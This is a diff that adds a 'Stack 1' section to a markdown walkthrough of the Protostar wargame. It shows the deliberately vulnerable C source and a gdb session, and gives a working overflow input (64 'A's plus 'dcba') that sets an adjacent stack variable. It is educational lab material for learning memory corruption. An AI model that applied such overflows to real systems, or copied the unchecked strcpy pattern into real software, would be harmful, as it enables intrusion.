@@ -82,7 +82,7 @@ Now we can start !
 
 This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
 
-This level is at /opt/protostar/bin/stack0
+This level is at `/opt/protostar/bin/stack0`
 
 ### Challenge source code
 
@@ -198,5 +198,78 @@ you have changed the 'modified' variable
 We solved it !
 
 I'll see you in the next challenge !
+
+
+## Stack 1
+
+### Challenge description
+
+This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
+
+This level is at `/opt/protostar/bin/stack1`
+
+Hints
+
++ If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
++ Protostar is little endian
+
+
+### Challenge source code
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  if(argc == 1) {
+      errx(1, "please specify an argument\n");
+  }
+
+  modified = 0;
+  strcpy(buffer, argv[1]);
+
+  if(modified == 0x61626364) {
+      printf("you have correctly got the variable to the right value\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+}
+```
+### Challenge solution
+
+This is exactly like the first challenge, the only difference is `modified` needs a specific value `0x61626364`.
+
+Using the ascii table , `0x61` is the character `a`, `0x62` is `b`, then `c`, and finally `d`,
+
+> Note : man ascii to check the ascii table.
+
+Let's explore this in gdb
+
+```bash
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd
+Try again, you got 0x64636261
+(gdb) x/x $esp+0x5c
+0xbffff74c:     0x64636261
+```
+
+Why isn't working ?
+
+Notice that the bytes are in the reverse order, since protostar follows little endian byte order.
+
+To solve this, all we need to do is to reverse the order of abcd.
+> abcd > dcba
+
+```bash
+user@protostar:/opt/protostar/bin$ ./stack1 $(perl -e 'print "A" x 64 . "dcba"')
+you have correctly got the variable to the right value
+```
+
+We solved it :D
 
 
